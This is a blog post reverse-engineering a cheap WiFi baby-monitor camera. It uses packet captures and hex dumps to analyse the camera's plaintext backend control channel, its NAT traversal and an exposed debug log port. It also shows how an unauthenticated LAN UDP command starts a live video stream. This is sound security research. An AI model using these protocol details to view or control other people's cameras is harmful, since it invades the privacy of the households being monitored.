---
layout: post
title:  "Analysis of a cheap WiFi camera"
date:   2017-09-07 21:21:10 +0200
category: reverse-engineering
tags: [jiafeigou, WiFi, hardware, protocols]
---
This post is about a cheap WiFi camera sold as a baby/house monitor. I was interested to know how it allows remote access without port forwarding, so had a look at how it works. Please note that network traffic analyzed in these posts could be edited to preserve privacy. To keep things clear certain packets will be removed from example traffic when not relevant for the point I'm trying to make.

Introduction
------------

The camera in question is a "Smart WiFi Camera" sold under the brand name [Sinji](http://www.sinjiproducts.com). To use the camera the user is supposed to use an app called "Doby" according to the user manual supplied, this app will assist in setting up the camera and can later be used to view the camera both on your home network as well as outside. According to the manual no port forwarding is needed to connect to the camera when away from home.

Since no ports have to be forwarded we can assume the camera will phone home to some kind of backed server on the internet, this is starting to look like a bad day for privacy so it's well worth a look into how this is actually working...

After installing the aforementioned "Doby" app (and registering a user account to use it, interestingly enough no valid email address is needed to register an account, you will however receive Chinese spam on the address provided) I tried to use it to set up the camera. The process involves the app making a connection to a WiFi SSID DOG-XXXXXX and after inputing WiFi settings for the camera it will start doing "stuff" to the camera resulting in it showing up in the "Doby" app. It's now possible to view the camera from the app. Note that since I have a Jolla smartphone I was not able to perform this onboarding process because the Android emulation layer does not work properly when the app tries to automatically connect to the "DOG" SSID and I had to resort to a normal Android phone to finish the process.

When browsing the play store for the app, I noticed that the package name is com.cylan.jiafeigou.zhongxing. Which is related to com.cylan.jiafeigou, an app known as "Clever Dog" from another [Chinese company](http://www.cleverdog.com.cn/) that builds WiFi baby monitors. On this website we're also able to locate a [Windows application](http://www.cleverdog.com.cn/services/download/) that works with the camera, this application will probably be of use later when doing research on the camera's protocols. This application however does not allow us to perform the onboarding process so without a supported smartphone platform it's not possible to set up the camera.

Now that the camera is up and running it's time to set some goals for further research.
1. How is the backend involved and what does that mean for privacy
2. How can we bend the camera to our will (and use it without the backend)
3. What's the security like for this product
4. Can we perform the onboarding procedure without the app

Backend
-------

To research the backend we'll start by looking at what happens when the camera boots, I'm assuming that it will try to connect to the backend and in some way keep a session alive in order to facilitate communication with the app when outside. I have set up a SPAN so I can see all traffic to and from the AP on which the camera is connected.
After getting a DHCP IP address, the device starts with some queries to NTP servers:
```
192.168.0.195   → 83.163.209.244  NTP 90  49154 123    NTP Version 1, reserved
192.168.0.195   → 206.108.0.131   NTP 90  49154 123    NTP Version 1, reserved
192.168.0.195   → 8.8.8.8         DNS 74  49153 53     Standard query 0x0000 A ntp.neu.edu.cn
192.168.0.195   → 8.8.8.8         DNS 74  49153 53     Standard query 0x0000 A ntp.neu.edu.cn
8.8.8.8         → 192.168.0.195   DNS 122 53    49153  Standard query response 0x0000 A ntp.neu.edu.cn A 202.118.1.47 A 202.118.1.46 A 202.118.1.48
8.8.8.8         → 192.168.0.195   DNS 122 53    49153  Standard query response 0x0000 A ntp.neu.edu.cn A 202.118.1.47 A 202.118.1.46 A 202.118.1.48
192.168.0.195   → 202.118.1.47    NTP 90  49154 123    NTP Version 1, reserved
192.168.0.195   → 8.8.8.8         DNS 77  49153 53     Standard query 0x0001 A clock.cuhk.edu.hk
8.8.8.8         → 192.168.0.195   DNS 133 53    49153  Standard query response 0x0001 No such name A clock.cuhk.edu.hk SOA ddi.itsc.cuhk.edu.hk
192.168.0.195   → 8.8.8.8         DNS 76  49153 53     Standard query 0x0001 A clock.sjc.he.net
206.108.0.131   → 192.168.0.195   NTP 90  123   49154  NTP Version 1, server
8.8.8.8         → 192.168.0.195   DNS 92  53    49153  Standard query response 0x0001 A clock.sjc.he.net A 216.218.254.202
192.168.0.195   → 216.218.254.202 NTP 90  49154 123    NTP Version 1, reserved
216.218.254.202 → 192.168.0.195   NTP 90  123   49154  NTP Version 1, server
```
So far so good, not a big suprise it tries servers with a .cn and .hk domain.
Next up we're starting to get to more interesting stuff, a reference to jiafeigou:
```
192.168.0.195 → 8.8.8.8       DNS 73 49153 53     Standard query 0x0002 A yun.jfgou.com
8.8.8.8       → 192.168.0.195 DNS 89 53    49153  Standard query response 0x0002 A yun.jfgou.com A 47.91.75.6
```
The camera now tries to connect to this host on port 443:
```
192.168.0.195 → 47.91.75.6    TCP 60  49153 443     49153 → 443 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
192.168.0.195 → 47.91.75.6    TCP 60  49153 443     [TCP Retransmission] 49153 → 443 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
192.168.0.195 → 47.91.75.6    TCP 60  49153 443     [TCP Retransmission] 49153 → 443 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
192.168.0.195 → 47.91.75.6    TCP 60  49153 443     [TCP Retransmission] 49153 → 443 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
192.168.0.195 → 47.91.75.6    TCP 60  49153 443     [TCP Retransmission] 49153 → 443 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
192.168.0.195 → 47.91.75.6    TCP 60  49153 443     [TCP Retransmission] 49153 → 443 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
192.168.0.195 → 47.91.75.6    TCP 60  49154 443     49154 → 443 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
47.91.75.6    → 192.168.0.195 TCP 60  443   49154   443 → 49154 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0 MSS=1460
192.168.0.195 → 47.91.75.6    TCP 60  49154 443     49154 → 443 [ACK] Seq=1 Ack=1 Win=5600 Len=0
192.168.0.195 → 47.91.75.6    SSL 81  49154 443     Continuation Data
47.91.75.6    → 192.168.0.195 TCP 60  443   49154   443 → 49154 [ACK] Seq=1 Ack=28 Win=29200 Len=0
192.168.0.195 → 47.91.75.6    SSL 120 49154 443     Continuation Data
47.91.75.6    → 192.168.0.195 TCP 60  443   49154   443 → 49154 [ACK] Seq=1 Ack=94 Win=29200 Len=0
47.91.75.6    → 192.168.0.195 SSL 77  443   49154   Continuation Data
47.91.75.6    → 192.168.0.195 SSL 125 443   49154   Continuation Data
192.168.0.195 → 47.91.75.6    TCP 60  49154 443     49154 → 443 [ACK] Seq=94 Ack=95 Win=5506 Len=0
```
After failing to connect on the first try the second try succeeds, but there is something odd going on. How can there be a SSL session without a key exchange? Let's put this down as something needing further research.
```
192.168.0.195 → 8.8.8.8       DNS 73 49153 53     Standard query 0x0003 A log.jfgou.com
8.8.8.8       → 192.168.0.195 DNS 89 53    49153  Standard query response 0x0003 A log.jfgou.com A 47.91.75.6
192.168.0.195 → 47.91.75.6    TCP 60 49155 2000   49155 → 2000 [SYN] Seq=0 Win=5600 Len=0 MSS=1400
47.91.75.6    → 192.168.0.195 TCP 60 2000  49155  2000 → 49155 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
```
I'm guessing that the log server it's trying to connect to is disabled and only used for development, the pattern of trying to connect and getting refused with a RST keeps repeating while the camera is powered on. If we're short of logs we could set up a local DNS server directing that hostname to a host with netcat running on port 2000 to have a look.
After a few TCP messages to 47.91.75.6:443 the camera starts sending UDP to an unresolved IP address:
```
192.168.0.195 → 47.88.19.41   QUIC         62 49155 80     Payload (Encrypted), PKN: 1
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 100    Message: Binding Request
192.168.0.195 → 47.88.19.41   CLDAP        62 49155 389  
192.168.0.195 → 47.88.19.41   QUIC         62 49155 443    Payload (Encrypted), PKN: 1
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 1000   Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 3479   Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 4000   Message: Binding Request
192.168.0.195 → 47.88.19.41   TAPA         62 49155 5000   Tunnel - V=0, T=Type 1[Malformed Packet]
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 6000   Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 7000   Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 8000   Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 9000   Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 10000  Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 30000  Message: Binding Request
192.168.0.195 → 47.88.19.41   CLASSIC-STUN 62 49155 50000  Message: Binding Request
192.168.0.195 → 47.91.75.6    QUIC         62 49155 80     Payload (Encrypted), PKN: 1
192.168.0.195 → 47.91.75.6    CLASSIC-STUN 62 49155 100    Message: Binding Request
47.91.75.6    → 192.168.0.195 QUIC         98 80    49155  Payload (Encrypted), PKN: 184
192.168.0.195 → 47.91.75.6    CLDAP        62 49155 389  
192.168.0.195 → 47.91.75.6    QUIC         62 49155 443    Payload (Encrypted), PKN: 1
47.91.75.6    → 192.168.0.195 CLASSIC-STUN 98 100   49155  Message: Binding Response
192.168.0.195 → 47.91.75.6    CLASSIC-STUN 62 49155 1000   Message: Binding Request
47.91.75.6    → 192.168.0.195 CLDAP        98 389   49155  
47.88.19.41   → 192.168.0.195 QUIC         98 80    49155  Payload (Encrypted), PKN: 184
192.168.0.195 → 47.91.75.6    CLASSIC-STUN 62 49155 3479   Message: Binding Request
47.91.75.6    → 192.168.0.195 QUIC         98 443   49155  443 → 49155 Len=56[Malformed Packet]
47.88.19.41   → 192.168.0.195 CLASSIC-STUN 98 100   49155  Message: Binding Response
192.168.0.195 → 47.91.75.6    CLASSIC-STUN 62 49155 4000   Message: Binding Request
47.91.75.6    → 192.168.0.195 CLASSIC-STUN 98 1000  49155  Message: Binding Response
47.88.19.41   → 192.168.0.195 CLDAP        98 389   49155  
192.168.0.195 → 47.91.75.6    TAPA         62 49155 5000   Tunnel - V=0, T=Type 1[Malformed Packet]
47.91.75.6    → 192.168.0.195 CLASSIC-STUN 98 3479  49155  Message: Binding Response
192.168.0.195 → 47.91.75.6    CLASSIC-STUN 62 49155 6000   Message: Binding Request
47.91.75.6    → 192.168.0.195 CLASSIC-STUN 98 4000  49155  Message: Binding Response
47.88.19.41   → 192.168.0.195 QUIC         98 443   49155  443 → 49155 Len=56[Malformed Packet]
47.88.19.41   → 192.168.0.195 CLASSIC-STUN 98 1000  49155  Message: Binding Response
192.168.0.195 → 47.91.75.6    CLASSIC-STUN 62 49155 7000   Message: Binding Request
```
Since it's trying a range of ports and Wireshark thinks it's got something to do with STUN this could be the way the camera is trying to set up a session through my NAT/firewall. It looks like 47.91.75.6 and 47.88.19.41 are involved in the STUN process. Since I have no knowledge about STUN other that knowing that it's used to penetrate NAT I will leave it at this for the moment, sending UDP packets to different ports seems to confirm that it's looking for a way through NAT/firewalls. Let's first find out where 47.88.19.41 comes from, it seems unlogical to have it hardcoded when other hosts are refered to by their hostnames. Using display filter `frame.data contains "47.88.19.41"` gives me one frame, and its part of the TCP conversation with yun.jfgou.com:443, time to examine the TCP payload of that frame:
```
0000   96 13 a0 a0 92 ab 34 37 2e 38 38 2e 31 39 2e 34  ......47.88.19.4
0010   31 aa 34 37 2e 39 31 2e 37 35 2e 36 9f 50 64 cd  1.47.91.75.6.Pd.
0020   01 85 cd 01 bb cd 03 e8 cd 0d 97 cd 0f a0 cd 13  ................
0030   88 cd 17 70 cd 1b 58 cd 1f 40 cd 23 28 cd 27 10  ...p..X..@.#(.'.
0040   cd 75 30 cd c3 50 00                             .u0..P.
```
So it looks like the connection to yun.jfgou.com:443 is actually an unencrypted connection used as a control channel. It being plain text explains why there was no key exchange earlier. Using port 443 could be a sloppy attempt to fool firewalls... I will try to analyze the control channel traffic to find out more, in each frame I will point out the information we know or could guess by looking at the app. Data that has no clear purpose at the moment will be ignored for now.

#### Client to backend
```
0000   96 6a a0 a0 05 a8 32 2e 34 2e 36 2e 33 34 ac 30  .j....2.4.6.34.0
0010   30 30 30 30 30 30 30 30 30 30 30                 00000000000
```
First packet starts off by sending the firmware version 2.4.6.34 (as shown in the app) and next the device ID (here replaced by all 0s)
```
0000   9b 64 a0 a0 ac 30 30 30 30 30 30 30 30 30 30 30  .d...00000000000
0010   30 01 a4 58 58 58 58 05 a8 32 2e 34 2e 36 2e 33  0..XXXX..2.4.6.3
0020   34 a9 44 4f 47 2d 31 57 2d 56 34 ce 59 aa 85 fa  4.DOG-1W-V4.Y...
0030   b1 30 30 3a 30 30 3a 30 30 3a 30 30 3a 30 30 3a  .00:00:00:00:00:
0040   30 30                                            00
```
Second packet send the device ID again together with my SSID (as shown in the app, replaced here by "XXXX". Next up is the software version again followed by the string "DOG-1W-V4", this could be a device type. Finally there is the MAC address of the camera, here replaced with 0s as well.

#### Backend to client
```
0000   96 12 a0 a0 91 92 ad 79 75 6e 2e 6a 66 67 6f 75  .......yun.jfgou
0010   2e 63 6f 6d 50 78 01                             .comPx.
```
The backend responds with another reference to yun.jfgou.com
```
0000   96 13 a0 a0 92 ab 34 37 2e 38 38 2e 31 39 2e 34  ......47.88.19.4
0010   31 aa 34 37 2e 39 31 2e 37 35 2e 36 9f 50 64 cd  1.47.91.75.6.Pd.
0020   01 85 cd 01 bb cd 03 e8 cd 0d 97 cd 0f a0 cd 13  ................
0030   88 cd 17 70 cd 1b 58 cd 1f 40 cd 23 28 cd 27 10  ...p..X..@.#(.'.
0040   cd 75 30 cd c3 50 00                             .u0..P.
```
Here is the packet we saw earlier with the STUN server addresses...
```
0000   9b 6b ac 30 30 30 30 30 30 30 30 30 30 30 30 a0  .k.000000000000.
0010   00 a0 00 a0 a0 00 a0 a0                          ........
```
Device ID
```
0000   99 cc 80 a0 ac 30 30 30 30 30 30 30 30 30 30 30  .....00000000000
0010   30 03 bd 6f 73 73 2d 65 75 2d 63 65 6e 74 72 61  0..oss-eu-centra
0020   6c 2d 31 2e 61 6c 69 79 75 6e 63 73 2e 63 6f 6d  l-1.aliyuncs.com
0030   ac 64 65 2d 6a 69 61 66 65 69 67 6f 75 b0 42 42  .de-jiafeigou.BB
0040   42 42 42 42 42 42 42 42 42 42 42 42 42 42 da 00  BBBBBBBBBBBBBB..
0050   40 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  @CCCCCCCCCCCCCCC
0060   43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0070   43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0080   43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
0090   43 ce 44 44 44 44                                C.DDDD
```
Later on these strings are used for HTTP PUT requests used to upload periodic snapshots to the backend. For more information please look at the Security chapter where I will explain more about these strings.

```
0000   dc 00 13 68 a0 ac 30 30 30 30 30 30 30 30 30 30  ...h..0000000000
0010   30 30 01 00 cd 17 3b 7f 01 00 00 cd 0e 10 00 01  00....;.........
0020   00 ce 00 09 0b 52 00 00 01 b0 45 75 72 6f 70 65  .....R....Europe
0030   2f 41 6d 73 74 65 72 64 61 6d                    /Amsterdam
```
Setting my local timezone, probably used for the time overlaid on the video feed.
```
0000   9c 65 ac 30 30 30 30 30 30 30 30 30 30 30 30 ac  .e.000000000000.
0010   30 30 30 30 30 30 30 30 30 30 30 30 00 a0 ac 30  000000000000...0
0020   30 30 30 30 30 30 30 30 30 30 30 05 a8 32 2e 34  00000000000..2.4
0030   2e 36 2e 33 34 00 ac 30 30 30 30 30 30 30 30 30  .6.34..000000000
0040   30 30 30 b3 58 58 58 58 40 58 58 58 58 58 58 58  000.XXXX@XXXXXXX
0050   58 58 58 2e 63 6f 6d ce 59 aa 86 0e              XXX.com.Y...
```
Four mentions of the device ID and a reply of the firmware version as well as the username I registered for the app (also modified...)
```
0000   94 75 a0 ac 30 30 30 30 30 30 30 30 30 30 30 30  .u..000000000000
0010   00                                               .
```
And another short packet with the device ID with unknown purpose. Followed by some more packets which contain no plaintext clues as to their function.
#### Client to backend
```
0000   97 72 ac 30 30 30 30 30 30 30 30 30 30 30 30 a0  .r.000000000000.
0010   00 00 00 00                                      ....
```
```
0000   98 cd 4e e8 ac 30 30 30 30 30 30 30 30 30 30 30  ..N..00000000000
0010   30 a0 ce 76 58 e5 bf 01 c2 91 92 cd 02 02 00 c2  0..vX...........
```
#### Backend to client
```
0000   95 cd 4e e9 a0 ac 30 30 30 30 30 30 30 30 30 30  ..N...0000000000
0010   30 30 ce 76 58 e5 bf 81 cd 02 02 90              00.vX.......
```
#### Client to backend
```
0000   94 15 ac 30 30 30 30 30 30 30 30 30 30 30 30 a0  ...000000000000.
0010   dc 00 1e 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
0020   01 01 02 02 02 02 02 02 02 02 02 02 02 02 00 02  ................
0030   02                                               .
```
After this the initialisation seems to be finished because the intensive communication with the backend ceases.
Let's summarize the information we know so far:
- The camera tries to connect to a certain hostname as the backend
- The backend is used to logging, but this is not available at the moment
- The backend tells the camera which STUN servers to use
- Throughout communications the device ID is used, it's always preceded by 0xAC
- Timezone information is sent to the device. I never set a timezone, maybe it uses IP geolocation to pick a timezone?
- We can disable communication to the backend by blocking traffic to yun.jfgou.com
- Most importantly, communication to the backend is **not encrypted**

Now that the camera is online, we can also run a portscan to see if that yields any ways in. As it turns out there is a kind of log page at TCP port 54321.
On that page there are plenty of strange log messages:
```
’ªdo_log_ack·Unknown debug message: ’ªdo_log_ack£112’ªdo_log_ack¡
’ªdo_log_ack·Unknown debug message: ’ªdo_log_ack£112’ªdo_log_ack¡
’ªdo_log_ack·Unknown debug message: ’ªdo_log_ack£108’ªdo_log_ack¡
’ªdo_log_ack·Unknown debug message: ’ªdo_log_ack£105’ªdo_log_ack¡
```
Also references to the STUN process:
```
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�4sockidx[0]:send 20 Stun message to 47.91.75.6:10000
’ªdo_log_ack½sendNatMessage acture len=20
’ªdo_log_ackÚ�'[p2p.c     : 1790] relay check timeout
’ªdo_log_ack°                ’ªdo_log_ack¦   80 ’ªdo_log_ack¦  100 ’ªdo_log_ack¦  389 ’ªdo_log_ack¦  443 ’ªdo_log_ack¦ 1000 ’ªdo_log_ack¦ 3479 ’ªdo_log_ack¦ 4000 ’ªdo_log_ack¦ 5000 ’ªdo_log_ack¦ 6000 ’ªdo_log_ack¦ 7000 ’ªdo_log_ack¦ 8000 ’ªdo_log_ack¦ 9000 ’ªdo_log_ack¦10000 ’ªdo_log_ack¦30000 ’ªdo_log_ack¦50000 ’ªdo_log_ack¡
’ªdo_log_ack¬47.88.19.41	’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¡
’ªdo_log_ack«47.91.75.6	’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    0 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¡
’ªdo_log_ackÚ�  relay ip:2, port:15, nrMask:30
’ªdo_log_ack°                ’ªdo_log_ack¦   80 ’ªdo_log_ack¦  100 ’ªdo_log_ack¦  389 ’ªdo_log_ack¦  443 ’ªdo_log_ack¦ 1000 ’ªdo_log_ack¦ 3479 ’ªdo_log_ack¦ 4000 ’ªdo_log_ack¦ 5000 ’ªdo_log_ack¦ 6000 ’ªdo_log_ack¦ 7000 ’ªdo_log_ack¦ 8000 ’ªdo_log_ack¦ 9000 ’ªdo_log_ack¦10000 ’ªdo_log_ack¦30000 ’ªdo_log_ack¦50000 ’ªdo_log_ack¡
’ªdo_log_ack¬47.88.19.41	’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¦    1 ’ªdo_log_ack¡
’ªdo_log_ack«47.91.75.6	’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    0 ’ªdo_log_ack¦    2 ’ªdo_log_ack¦    2 ’ªdo_log_ack¡
’ªdo_log_ack¡[’ªdo_log_ack¢21’ªdo_log_ack¢, ’ªdo_log_ack®"000000000000"’ªdo_log_ack¢, ’ªdo_log_ack¢""’ªdo_log_ack¢, ’ªdo_log_ack¡[’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡1’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡0’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¢, ’ªdo_log_ack¡2’ªdo_log_ack¡]’ªdo_log_ack¡]’ªdo_log_ackÚ�&jfg_client: send relay info response.
’ªdo_log_ack¸p2p: P2PRelayCheckClear
’ªdo_log_ack²close socket[0]:3
```
Every 10 seconds there are status messages:
```
’ªdo_log_ackÚ�e09-09 12:16:40 CID=000000000000 UP=0:15 S#=152 F#=149 V=0 AO=0 AI=0 RA=0 RV=0 R=0 FPS=14 MD=0 CPU=0%
```
It looks like the device ID is called CID in the software.
Every 2 minutes there is a heartbeat to the backend:
```
’ªdo_log_ackÚ�$jfg_client: send heartbeat message.
’ªdo_log_ackÚ�*jfg_client: receive keepalive ack message
```

Application
-----------

Now that the bootup and idle phases have been analyzed it's time to use the app to view the video feed on the local network. To make it easier to analyze the communications I will run the PC application and use that to view the camera. This way I can trace the traffic the application is generating easier than on an iOS/Android device...

We will first look at the log on port 54321:
As soon as the application is started we receive a bunch of the following log messages
```
’ªdo_log_ackÚ�,jfg_ctrl: recv message, magic=4D4A, id=1004
```
These correspond to UDP broadcasts (255.255.255.255:10008) from the application:
```
0000   4d 4a 10 04 00 00 00 00 00 00 00 00 00 00 00 00  MJ..............
0010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0020   00 00 00 00 00 00                                ......
```
We can see the first 2 bytes are the magic number 0x4D4A and after that the (hex) command id 0x1004, looks like the rest is just padding. The camera will respond to this with its information (CID, MAC and firmware version), this is not logged on port 54321 though.
```
0000   4d 4a 10 0e 30 30 30 30 30 30 30 30 30 30 30 30  MJ..000000000000
0010   00 00 00 00 30 30 3a 30 30 3a 30 30 3a 30 30 3a  ....00:00:00:00:
0020   30 30 3a 30 30 00 32 2e 34 2e 36 2e 33 34 00 00  00:00.2.4.6.34..
0030   00 00 00 00 00 00                                ......
```
When we try to play the stream another command is loggged:
```
’ªdo_log_ackÚ�,jfg_ctrl: recv message, magic=4D4A, id=1007
’ªdo_log_ackÚ�rjfg_ctrl: play request, call id=[0] url=[1837:1837], target=[192.168.0.138], parsed=[1837:1837] (fixed port=8888)
’ªdo_log_ackÚ�”jfg_rtpserver: do_connect(call_id=0, channel_id=16384, local=[VideoPort=0, AudioPort=0], target=[IP=192.168.0.138, VideoPort=1837, AudioPort=1837])
’ªdo_log_ackºjfg_rtpserver_play_live()
’ªdo_log_ackÚ�!jfg_rtpserver_update_perf(reset)
```
And the corresponding packet (unicast to port 10008):
```
0000   4d 4a 10 07 30 30 30 30 30 30 30 30 30 30 30 30  MJ..000000000000
0010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0020   00 00 00 00 00 00 31 38 33 37 3a 31 38 33 37 00  ......1837:1837.
0030   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0040   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0050   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0060   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0070   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0080   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0090   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00a0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00b0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00c0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00d0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00e0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00f0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0100   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0110   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0120   00 00 00 00 00 00                                ......
```
Cool, there is a command that will start a RTP (!) stream to the host that sent it, and we can even pick the port to use. It's strange to see so much padding in the packet, maybe more parameters can be supplied? In Wireshark we see a stream to our host on the selected port:
```
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
192.168.0.195 → 192.168.0.138 UDP 1394 49159 1837  49159 → 1837 Len=1352
```
Stopping the stream yields another command:
```
’ªdo_log_ackÚ�,jfg_ctrl: recv message, magic=4D4A, id=1008
’ªdo_log_ack½jfg_ctrl: stop request.LAN=1
’ªdo_log_ack»jfg_rtpserver_disconnect()
’ªdo_log_ackÚ�&jfg_rtpserver: audio disconnect(fd=4)
’ªdo_log_ackÚ�!jfg_rtpserver: reset bps=320Kbps
```
```
0000   4d 4a 10 08 30 30 30 30 30 30 30 30 30 30 30 30  MJ..000000000000
0010   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0020   00 00 00 00 00 00                                ......
```
